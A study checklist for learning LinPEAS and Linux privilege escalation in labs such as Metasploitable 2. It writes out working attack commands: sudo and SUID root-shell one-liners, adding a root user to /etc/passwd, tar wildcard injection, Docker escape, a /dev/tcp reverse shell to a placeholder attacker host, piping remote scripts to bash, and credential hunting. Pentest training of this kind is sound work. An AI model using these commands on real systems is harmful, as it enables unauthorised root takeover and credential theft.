# 🐉 LinPEAS: Complete Mastery Checklist

> **What is LinPEAS?** LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive automated privilege escalation enumeration tool for Linux systems. It searches for misconfigurations, vulnerable software, sensitive files, and potential escalation paths — all in one script.
>
> **Why does it exist?** After gaining an initial low-privilege shell on a Linux target, you need to escalate to root. Manually checking hundreds of potential escalation vectors is slow and error-prone. LinPEAS automates this enumeration in seconds, highlighting findings with color-coded severity.
>
> **When to use it:** Immediately after gaining initial access to a Linux system with a low-privilege shell. During post-exploitation enumeration. CTF challenges requiring privilege escalation. Internal penetration tests after compromising a Linux host.
>
> **When to avoid it:** When stealth is critical (LinPEAS is noisy — reads many files, runs many commands). When the target has EDR/monitoring that detects enumeration scripts. On systems you don't have authorization to test. When you need Windows privesc (use WinPEAS instead).
>
> **What mastering LinPEAS unlocks:** Rapid privilege escalation enumeration. Deep understanding of Linux security misconfigurations. OSCP/PNPT readiness. Ability to manually verify and exploit every finding LinPEAS reports. Understanding of Linux internals from a security perspective.

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals & Linux Privesc Theory | 6 | 3–4 hours |
| 2 | Core LinPEAS Sections | 8 | 5–7 hours |
| 3 | Intermediate (Interpretation & Exploitation) | 6 | 5–7 hours |
| 4 | Advanced (Manual Verification, Alternatives) | 5 | 4–6 hours |
| 5 | Tool Integration | 4 | 2–3 hours |
| 6 | Practical Labs | 4 | 6–10 hours |
| 7 | Methodology & Limitations | 3 | 2–3 hours |
| 8 | Mastery Challenges | 3 | 4–6 hours |
| | **Total** | **39** | **~31–46 hours** |

**Prerequisites:** Linux command line proficiency. Initial shell access on a target. Understanding of Linux file permissions, SUID/SGID, cron, services, and user management. A vulnerable target (Metasploitable 2).

**Alternatives:** LinEnum (lighter, less comprehensive), linux-exploit-suggester (kernel exploits only), linux-smart-enumeration (LSE — similar scope, different style), pspy (process monitoring without root), GTFOBins (manual reference for binary exploitation).

---

# PHASE 1: FUNDAMENTALS & LINUX PRIVESC THEORY

---

### Task 1.1 — Understand the Privilege Escalation Goal

- [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand why privilege escalation matters: you have a shell as `www-data` or a regular user, but you need `root` to fully control the system, access all data, install persistence, and pivot. |
| **Skills Learned** | The gap between initial access and full compromise, why root matters (full filesystem access, service control, credential access, kernel-level control), the concept that privesc is finding a misconfiguration the sysadmin left behind. |
| **Practical Exercise** | From a low-privilege shell: run `id`, `whoami`, `sudo -l`, `cat /etc/shadow` (should fail). Document what you CAN and CANNOT do as the current user. This gap is what privesc closes. |
| **Expected Output** | Understanding of the current user's limitations and why root is the goal. |
| **Common Mistakes** | Skipping enumeration and guessing escalation paths. Not checking `sudo -l` first (the most common and easiest privesc vector). Trying kernel exploits first (they're unreliable and should be a last resort). |

---

### Task 1.2 — The Privilege Escalation Methodology

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Learn the systematic privesc methodology: (1) Situational awareness, (2) User/group enumeration, (3) Sudo permissions, (4) SUID/SGID binaries, (5) Cron jobs, (6) Writable files/directories, (7) Network services, (8) Credentials in files, (9) Kernel exploits. LinPEAS automates ALL of these checks. |
| **Skills Learned** | The privesc checklist in priority order (easiest/safest first, riskiest last), understanding each vector, why systematic enumeration beats guessing. |
| **Practical Exercise** | Write out the privesc methodology as a numbered checklist. For each vector, write one sentence explaining how it leads to root. This becomes your mental framework that LinPEAS output maps to. |
| **Expected Output** | Personal privesc methodology checklist. Understanding that LinPEAS organizes its output along these same vectors. |
| **Common Mistakes** | Jumping to kernel exploits (risky, may crash the system — try everything else first). Not being systematic (missing an easy `sudo -l` entry because you skipped the check). Not knowing what each finding MEANS (LinPEAS shows you the data, YOU must interpret it). |

---

### Task 1.3 — Download & Transfer Methods

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Get LinPEAS onto the target system using multiple transfer methods. You won't always have the same tools available — know multiple techniques. |
| **Skills Learned** | File transfer techniques: `wget`, `curl`, Python HTTP server, Netcat transfer, base64 encoding, `scp`, hosting on attacker web server. |
| **Transfer Methods** | **wget:** Attacker: `python3 -m http.server 8080`. Target: `wget http://<attacker>:8080/linpeas.sh`. **curl:** `curl http://<attacker>:8080/linpeas.sh -o /tmp/linpeas.sh`. **Netcat:** Attacker: `nc -lvnp 5555 < linpeas.sh`. Target: `nc <attacker> 5555 > /tmp/linpeas.sh`. **Base64:** Attacker: `base64 linpeas.sh`. Target: `echo "<base64>" | base64 -d > /tmp/linpeas.sh`. **No transfer:** `curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` (if target has internet — rare in pentests). |
| **Expected Output** | LinPEAS transferred to target and executable (`chmod +x /tmp/linpeas.sh`). Multiple transfer methods practiced. |
| **Common Mistakes** | Not making the script executable (`chmod +x`). Transferring to a directory where execution is blocked (use `/tmp` or `/dev/shm`). Using `wget` when only `curl` is available (or vice versa). Not having a backup transfer method when the first fails. |

---

### Task 1.4 — LinPEAS Execution Options

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand LinPEAS execution flags and options: full scan, specific checks, quiet mode, output saving, and network checks. |
| **Syntax** | Full scan: `./linpeas.sh`. Save output: `./linpeas.sh | tee linpeas-output.txt`. Specific checks: `./linpeas.sh -s` (superfast — skip slow checks). No network checks: `./linpeas.sh -N`. No colors (for log files): `./linpeas.sh -a > output.txt`. Quiet (no banner): `./linpeas.sh -q`. |
| **Expected Output** | Understanding of execution options. Saved output file for later analysis. |
| **Common Mistakes** | Not saving output (`tee` saves to file AND displays on screen — essential because LinPEAS output is long). Running without `-a` when piping to a file (ANSI color codes make the file unreadable). Not using `-s` when time is limited (full scan takes several minutes). |

---

### Task 1.5 — Understanding LinPEAS Color Coding

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand LinPEAS's color-coded severity system. Colors tell you where to focus your attention — don't read everything linearly, prioritize by color. |
| **Color System** | 🔴 **RED/YELLOW on RED background:** 95% chance of privilege escalation — investigate immediately. 🟡 **RED:** Important misconfiguration — high probability of exploitation. 🟢 **YELLOW:** Interesting information — may lead to escalation with additional context. ⚪ **GREEN:** Normal/expected configuration — no issue. 🔵 **LIGHT CYAN:** Normal users info. 🔵 **BLUE:** Additional info — supplementary context. |
| **Expected Output** | Ability to triage LinPEAS output by color. Understanding that red/yellow items deserve immediate investigation, while green items can usually be skipped. |
| **Common Mistakes** | Reading every line equally (LinPEAS output is hundreds of lines — prioritize by color). Ignoring yellow items (they combine with other findings for escalation). Not understanding that GREEN means "this was checked and is normal" (not "this is a finding"). |

---

### Task 1.6 — LinPEAS vs Manual Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand that LinPEAS is an ENUMERATION tool, not an EXPLOITATION tool. It finds potential escalation vectors — YOU must verify and exploit them. Every LinPEAS finding should map to a manual command you can run. |
| **Skills Learned** | The difference between enumeration and exploitation, why automated findings need manual verification (false positives), building manual command equivalents for each LinPEAS check. |
| **Practical Exercise** | For each LinPEAS section, write the equivalent manual command: Sudo → `sudo -l`. SUID → `find / -perm -4000 2>/dev/null`. Cron → `cat /etc/crontab; ls -la /etc/cron.*`. Writable → `find / -writable 2>/dev/null`. |
| **Expected Output** | Manual command reference sheet mapping to each LinPEAS section. Understanding that you must be able to enumerate WITHOUT LinPEAS (some targets won't allow script execution). |
| **Common Mistakes** | Running LinPEAS and not knowing what to do with the findings (learn the exploitation technique for each finding type). Relying solely on LinPEAS (learn manual enumeration for environments where you can't upload scripts). |

---

# PHASE 2: CORE LINPEAS SECTIONS

---

### Task 2.1 — System Information Section

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Interpret LinPEAS's system information section: OS version, kernel version, architecture, hostname, and distribution details. This determines which kernel exploits and techniques are applicable. |
| **Key Checks** | Kernel version → search for kernel exploits (`searchsploit linux kernel <version>`). OS distribution and version → known vulnerabilities for that distro. Architecture (x86 vs x64) → determines exploit/tool compatibility. |
| **Manual Equivalent** | `uname -a`, `cat /etc/os-release`, `cat /proc/version`, `arch`. |
| **Expected Output** | System profile documented. Kernel exploit candidates identified (if applicable). |
| **Common Mistakes** | Immediately jumping to kernel exploits without checking safer vectors first. Not noting the architecture (x64 binary won't run on x86). Not searching for the specific kernel version in exploit databases. |

---

### Task 2.2 — Sudo Permissions Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Analyze LinPEAS's sudo findings: what commands can the current user run with sudo? Are any exploitable via GTFOBins? Is the password known or not required (NOPASSWD)? |
| **Key Findings** | `(ALL) NOPASSWD: ALL` → instant root: `sudo su`. `(ALL) NOPASSWD: /usr/bin/vim` → `sudo vim -c '!bash'`. `(root) /usr/bin/find` → `sudo find / -exec /bin/bash \;`. Any binary listed on GTFOBins with sudo capabilities. `env_keep+=LD_PRELOAD` → shared library injection. |
| **Manual Equivalent** | `sudo -l` (the single most important privesc command). |
| **Expected Output** | Sudo permissions analyzed. Exploitable entries identified. GTFOBins referenced for each allowed binary. |
| **Common Mistakes** | Not checking `sudo -l` at all (the #1 most common privesc path). Not knowing GTFOBins (the database of Unix binaries exploitable for privilege escalation). Not recognizing `NOPASSWD` vs password-required entries. Not trying `sudo su` or `sudo bash` even when not explicitly listed (misconfigured sudo may allow it). |

---

### Task 2.3 — SUID/SGID Binaries Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Analyze SUID binaries found by LinPEAS. SUID binaries run with the file OWNER's privileges (usually root) regardless of who executes them. Custom or vulnerable SUID binaries are a common escalation path. |
| **Key Findings** | Standard SUID binaries (expected): `/bin/su`, `/bin/mount`, `/bin/ping`, `/usr/bin/passwd`. Suspicious SUID binaries: anything custom, anything writable, anything not in the standard list. Check each against GTFOBins. `nmap` with SUID → `nmap --interactive` → `!sh` (root shell). `find` with SUID → `find / -exec /bin/bash -p \;`. `python` with SUID → `python -c 'import os; os.setuid(0); os.system("/bin/bash")'`. |
| **Manual Equivalent** | `find / -perm -4000 -type f 2>/dev/null` (SUID). `find / -perm -2000 -type f 2>/dev/null` (SGID). |
| **Expected Output** | All SUID binaries listed and categorized (standard vs suspicious). Suspicious binaries cross-referenced with GTFOBins. |
| **Common Mistakes** | Not recognizing custom SUID binaries (anything not in the standard set is worth investigating). Not checking GTFOBins for each binary. Not understanding the `-p` flag on bash (`bash -p` preserves the effective UID from SUID). |

---

### Task 2.4 — Cron Jobs Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Analyze cron job findings: jobs running as root that execute writable scripts, jobs using wildcards that can be exploited, jobs with relative paths that can be hijacked. |
| **Key Findings** | Root cron job executing a world-writable script → replace script content with reverse shell. Root cron job using wildcard (`*`) → inject malicious filenames (tar wildcard injection, etc.). Root cron job with relative path → PATH hijacking. |
| **Manual Equivalent** | `cat /etc/crontab`, `ls -la /etc/cron.*`, `crontab -l`, `systemctl list-timers`. For hidden cron jobs: `pspy` (monitors processes without root). |
| **Expected Output** | All cron jobs identified with their execution user. Writable scripts or exploitable configurations documented. |
| **Common Mistakes** | Not checking file permissions on scripts executed by cron (if you can write to them, you own the cron job). Not understanding wildcard injection (creating files named `--checkpoint=1` in a directory where `tar *` runs as root). Not using `pspy` to find hidden scheduled tasks that don't appear in crontab. |

---

### Task 2.5 — Writable Files & Directories Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Identify writable files and directories that shouldn't be writable: `/etc/passwd` (add root user), `/etc/shadow` (change root password), service configuration files, scripts in root's PATH. |
| **Key Findings** | Writable `/etc/passwd` → add a new root user: `echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd`. Writable `/etc/shadow` → change root's hash. Writable scripts in PATH → replace with malicious version. Writable service configs → modify to execute as root. |
| **Manual Equivalent** | `find / -writable -type f 2>/dev/null | grep -v proc`. `ls -la /etc/passwd /etc/shadow`. |
| **Expected Output** | Writable files identified with exploitation potential for each. |
| **Common Mistakes** | Not checking `/etc/passwd` writability (one of the easiest privesc paths). Not understanding that writable directories allow file creation (even if existing files aren't writable). |

---

### Task 2.6 — Credentials & Sensitive Files Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Review LinPEAS's search for credentials in files: passwords in config files, SSH keys, database credentials, API tokens, history files, and environment variables. |
| **Key Findings** | Passwords in `.bash_history` → reuse for `su root`. SSH private keys in home directories → login as other users. Database credentials in web application configs (wp-config.php, config.php) → database access → potentially root. AWS/cloud credentials → cloud account takeover. `.env` files with secrets → application compromise. |
| **Manual Equivalent** | `find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null`. `find / -name "id_rsa" 2>/dev/null`. `cat ~/.bash_history | grep -i pass`. `env | grep -i pass`. |
| **Expected Output** | All discoverable credentials collected. Credential reuse tested (`su root` with discovered passwords). |
| **Common Mistakes** | Not trying discovered passwords with `su` (password reuse is extremely common). Not checking web application config files (often contain database root passwords). Not checking history files (`~/.bash_history`, `~/.mysql_history`). |

---

### Task 2.7 — Network & Services Section

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Review internal network services that might not be visible from external scanning: services listening on localhost, internal-only databases, Docker sockets, and network interfaces. |
| **Key Findings** | Services on 127.0.0.1 only → may have weaker authentication. Docker socket accessible (`/var/run/docker.sock`) → container escape to root. MySQL on localhost with root:no-password → database access. Multiple network interfaces → pivot opportunity. |
| **Manual Equivalent** | `ss -tlnp`, `netstat -tlnp`, `ip addr`, `ls -la /var/run/docker.sock`. |
| **Expected Output** | Internal services mapped. Docker socket access checked. Pivoting opportunities identified. |
| **Common Mistakes** | Ignoring localhost-only services (they often have weaker security because they're "internal"). Not checking Docker socket (docker escape is an instant root escalation). |

---

### Task 2.8 — Capabilities & Container Escape Section

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Analyze Linux capabilities assigned to binaries and check for container escape opportunities (Docker, LXC, Kubernetes). |
| **Key Findings** | `cap_setuid` on Python/Perl → `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`. Container indicators: `.dockerenv` file, cgroup namespaces, limited `/proc`. Container escape: writable Docker socket, privileged container, mounted host filesystem. |
| **Manual Equivalent** | `getcap -r / 2>/dev/null`, `cat /proc/1/cgroup`, `ls -la /.dockerenv`. |
| **Expected Output** | Capabilities-based escalation paths identified. Container environment detected and escape paths evaluated. |
| **Common Mistakes** | Not understanding Linux capabilities (they're granular alternatives to full SUID — `cap_setuid` is as dangerous as SUID root). Not recognizing container environments (privesc inside a container is different from a bare-metal host). |

---

# PHASE 3: INTERMEDIATE — EXPLOITATION

---

### Task 3.1 — GTFOBins Mastery

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Master GTFOBins — the comprehensive database of Unix binaries that can be exploited for privilege escalation via sudo, SUID, capabilities, or file operations. Every LinPEAS finding should be cross-referenced here. |
| **Skills Learned** | GTFOBins navigation, understanding exploitation contexts (sudo, SUID, capabilities, limited SUID), applying GTFOBins techniques to LinPEAS findings, knowing the top 20 most commonly exploitable binaries. |
| **Key Binaries** | `vim`, `find`, `python`, `perl`, `ruby`, `awk`, `nmap`, `less`, `more`, `man`, `ftp`, `socat`, `wget`, `curl`, `tar`, `zip`, `env`, `docker`, `bash`, `cp`. |
| **Practical Exercise** | Visit GTFOBins. For each of the top 20 binaries, read the sudo and SUID exploitation techniques. Practice at least 5 of them on a lab system. |
| **Expected Output** | GTFOBins proficiency for the most common binaries. Ability to immediately recognize exploitable sudo/SUID entries. |

---

### Task 3.2 — Exploiting Sudo Misconfigurations

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Practice exploiting common sudo misconfigurations found by LinPEAS: NOPASSWD entries, wildcard abuse, environment variable injection (LD_PRELOAD, LD_LIBRARY_PATH). |
| **Practical Exercise** | LD_PRELOAD: Write a shared library that spawns a shell → `sudo LD_PRELOAD=/tmp/exploit.so <allowed-binary>`. Sudo with wildcards: if `sudo /usr/bin/find /var/log -name *.log`, create a file named `-exec /bin/bash ;`. |
| **Expected Output** | Root shells obtained through at least three different sudo exploitation techniques. |

---

### Task 3.3 — Exploiting SUID Binaries

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Practice exploiting SUID binaries: known GTFOBins binaries, custom SUID binaries (reverse engineering with `strings`), and shared library hijacking on SUID binaries. |
| **Practical Exercise** | Find SUID binaries → check GTFOBins → exploit known techniques. For custom binaries: `strings <binary>` to find called commands → if relative paths used, create a PATH hijacking exploit. Shared library: `ldd <suid-binary>` → if a library path is writable or missing, create a malicious library. |
| **Expected Output** | Root shells from SUID exploitation. Understanding of PATH hijacking and shared library attacks. |

---

### Task 3.4 — Exploiting Cron Jobs

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Exploit writable cron scripts, wildcard injection, and PATH abuse in cron jobs to achieve root. |
| **Practical Exercise** | Writable script: `echo 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /opt/backup.sh` (if cron runs it as root). Tar wildcard: In a directory where root runs `tar cf backup.tar *`, create: `echo "" > "--checkpoint=1"` and `echo "" > "--checkpoint-action=exec=bash reverse.sh"`. |
| **Expected Output** | Root shell via cron job exploitation. Understanding of wildcard injection mechanics. |

---

### Task 3.5 — Kernel Exploit Identification & Execution

- [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | As a LAST RESORT, identify and execute kernel exploits. Use LinPEAS's kernel version findings with `linux-exploit-suggester` to find applicable exploits. |
| **Skills Learned** | Kernel exploit risk assessment (may crash the system), `linux-exploit-suggester` usage, compiling kernel exploits on/for the target, known reliable kernel exploits (DirtyPipe, DirtyCow, PwnKit). |
| **Practical Exercise** | `./linux-exploit-suggester.sh` → identify candidates → research each (is it reliable? does it crash the system?) → compile on attacker with matching architecture → transfer and execute. |
| **Expected Output** | Kernel exploit candidates identified. Risk-assessed. One reliable exploit tested in a lab environment. |
| **Common Mistakes** | Trying kernel exploits first (they're the riskiest option — always check sudo, SUID, cron, writable files first). Not compiling for the correct architecture. Not having a snapshot to restore if the exploit crashes the system. Running untested kernel exploits on production systems. |

---

### Task 3.6 — WinPEAS: Windows Equivalent Awareness

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | Know that WinPEAS is the Windows equivalent of LinPEAS. Understand the key differences in Windows privilege escalation vectors: service misconfigurations, unquoted service paths, AlwaysInstallElevated, token impersonation, stored credentials. |
| **Expected Output** | Awareness of WinPEAS and Windows privesc methodology. Understanding that the PEASS-ng suite covers both Linux and Windows. |

---

# PHASE 4: ADVANCED USAGE

---

### Task 4.1 — Running LinPEAS Without File Transfer

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Execute LinPEAS without writing it to disk (fileless execution). This avoids detection by file integrity monitoring and some AV solutions. |
| **Syntax** | From attacker HTTP server: `curl http://<attacker>:8080/linpeas.sh | bash`. From GitHub (if target has internet): `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash`. Piped through base64: encode on attacker → decode and execute on target. |
| **Expected Output** | LinPEAS executed without a file on disk. Output captured via `| tee /dev/shm/output.txt` or redirected to attacker via Netcat. |
| **Common Mistakes** | Not capturing output when running fileless (output scrolls past and is lost). Not understanding that fileless still leaves process traces. `/dev/shm` is a tmpfs — files there are in memory only. |

---

### Task 4.2 — Manual Enumeration When LinPEAS Can't Run

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Perform complete privilege escalation enumeration using only built-in commands when you can't transfer or execute LinPEAS (restricted shells, no write access, monitored environments). |
| **Manual Commands** | `id; whoami` → `sudo -l` → `find / -perm -4000 2>/dev/null` → `cat /etc/crontab; ls -la /etc/cron.*` → `find / -writable -type f 2>/dev/null` → `getcap -r / 2>/dev/null` → `cat /etc/passwd` → `ls -la /home/` → `env` → `cat ~/.bash_history` → `ss -tlnp` → `uname -a` → `find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null`. |
| **Expected Output** | Complete enumeration using only built-in commands. Results equivalent to LinPEAS but obtained manually. |

---

### Task 4.3 — Analyzing LinPEAS Source Code

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Read LinPEAS's source code to understand what each check does. This deepens your understanding of Linux security and helps you identify new escalation vectors that LinPEAS might miss. |
| **Practical Exercise** | Read the LinPEAS shell script. Identify each section's checks. Understand the `grep` patterns used for credential searching. Note any checks you could add or improve. |
| **Expected Output** | Understanding of LinPEAS internals. Ideas for additional manual checks not covered by LinPEAS. |

---

### Task 4.4 — pspy: Process Monitoring Without Root

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Use pspy to monitor processes running on the system without root privileges. This reveals hidden cron jobs, background services, and commands that aren't visible through normal cron enumeration. |
| **Syntax** | Transfer pspy to target → `./pspy64` (or `pspy32` for x86). Watch for recurring processes — especially those running as root (UID=0). |
| **Expected Output** | Hidden scheduled tasks discovered. Root processes observed that may be exploitable. |

---

### Task 4.5 — Docker/Container Escape Techniques

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Exploit container misconfigurations identified by LinPEAS: writable Docker socket, privileged containers, mounted host filesystems, dangerous capabilities. |
| **Key Techniques** | Docker socket: `docker run -v /:/host -it alpine chroot /host bash`. Privileged container: `mount /dev/sda1 /mnt && chroot /mnt bash`. Host PID namespace: access host processes. `cap_sys_admin` capability: mount host filesystem. |
| **Expected Output** | Root access on the HOST system from within a container. |

---

# PHASE 5: TOOL INTEGRATION

---

### Task 5.1 — Metasploit → LinPEAS Pipeline

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Workflow** | Metasploit exploit → Meterpreter → `upload linpeas.sh /tmp/` → `shell` → `chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas-output.txt` → `download /tmp/linpeas-output.txt`. |

---

### Task 5.2 — LinPEAS → GTFOBins → Exploitation Pipeline

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Workflow** | LinPEAS finds SUID `python3` → GTFOBins search → `python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'` → root. |

---

### Task 5.3 — LinPEAS → Hashcat Pipeline

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Workflow** | LinPEAS finds readable `/etc/shadow` or database credentials → extract hashes → transfer to attacker → crack with Hashcat → use cracked passwords for `su root`. |

---

### Task 5.4 — Netcat + LinPEAS: Remote Output Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Workflow** | Attacker: `nc -lvnp 9999 > linpeas-remote.txt`. Target: `./linpeas.sh | nc <attacker> 9999`. Review output on attacker with full color: `less -R linpeas-remote.txt`. |

---

# PHASE 6–8: LABS, METHODOLOGY & MASTERY

---

### Lab 6.1 — Beginner: Enumerate Metasploitable 2

- [ ] **Completed** · ⭐⭐ Beginner · ⏱️ 45 min

| **Scenario** | Get a low-privilege shell on Metasploitable 2. Transfer and run LinPEAS. Document all findings by category. |
| **Success Criteria** | LinPEAS executed successfully. All red/yellow findings documented. At least three escalation paths identified. |

---

### Lab 6.2 — Intermediate: LinPEAS to Root

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 90 min

| **Scenario** | Use LinPEAS findings to escalate to root on Metasploitable 2 using three different methods. |
| **Success Criteria** | Root obtained via three different paths (e.g., sudo, SUID, credentials). Each path documented with the LinPEAS finding that led to it. |

---

### Lab 6.3 — Advanced: Manual Enumeration Only

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 90 min

| **Scenario** | Escalate to root WITHOUT using LinPEAS — only manual commands. Then run LinPEAS and compare: did you miss anything? |
| **Success Criteria** | Root obtained manually. LinPEAS comparison revealing any missed vectors. |

---

### Lab 6.4 — Expert: Time-Boxed Escalation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 30 min

| **Scenario** | 30-minute time limit. Get a shell, run LinPEAS, identify the escalation path, and get root. Document everything. |
| **Success Criteria** | Root obtained within 30 minutes. Clean documentation of the complete path. |

---

### Task 7.1 — LinPEAS in the Pentest Lifecycle

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| **Objective** | Map LinPEAS to PTES: Post-Exploitation phase exclusively. LinPEAS requires initial access and is used to escalate privileges. |

---

### Task 7.2 — LinPEAS Limitations

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min

| **Key Limitations** | Enumeration only — does not exploit anything. Noisy — reads many files, generates logs. May trigger AV/EDR. Requires shell access. Some checks need specific tools installed. May miss custom/novel escalation paths. Linux only (WinPEAS for Windows). |

---

### Task 7.3 — Stealth Considerations

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 15 min

| **Key Points** | LinPEAS generates significant log entries. Use fileless execution when possible. Consider selective manual checks for stealth engagements. Clean up transferred files after use. Know that auditd and SIEM may alert on LinPEAS activity patterns. |

---

### Challenge 8.1 — Unknown Box Escalation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 120 min

| **Scenario** | Given initial access to an unknown Linux target, use LinPEAS and manual techniques to find and exploit every possible privilege escalation path. Document at least three paths to root. |

---

### Challenge 8.2 — LinPEAS Report Generator

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Parse LinPEAS output with a Bash/Python script that extracts only red/yellow findings and generates a clean markdown report with exploitation recommendations for each. |

---

### Challenge 8.3 — Teach Linux Privilege Escalation

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Prepare a 20-minute workshop on Linux privilege escalation using LinPEAS. Cover: methodology, running LinPEAS, interpreting output, exploiting top 5 finding types. Live demo to root. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can transfer and execute LinPEAS on any target | ☐ |
| Can interpret color-coded output and prioritize findings | ☐ |
| Can exploit sudo, SUID, cron, and writable file findings | ☐ |
| Can perform manual enumeration without LinPEAS | ☐ |
| Can use GTFOBins for binary exploitation | ☐ |
| Can identify kernel exploit candidates safely | ☐ |
| Can detect and exploit container misconfigurations | ☐ |
| Can integrate LinPEAS into full exploitation pipelines | ☐ |
| Can teach Linux privilege escalation methodology | ☐ |

---

## 🎯 Interview Questions

1. What is the first command you run after getting a low-privilege shell?
2. Explain the difference between LinPEAS and a kernel exploit suggester.
3. What are the top 5 privilege escalation vectors on Linux?
4. How do you exploit a SUID binary found by LinPEAS?
5. What is GTFOBins and how do you use it?
6. How do you perform privesc enumeration without uploading any tools?
7. What is the risk of running kernel exploits during a pentest?
8. How do you escalate privileges via writable `/etc/passwd`?
9. What is wildcard injection in cron jobs?
10. How do you escape a Docker container to the host?
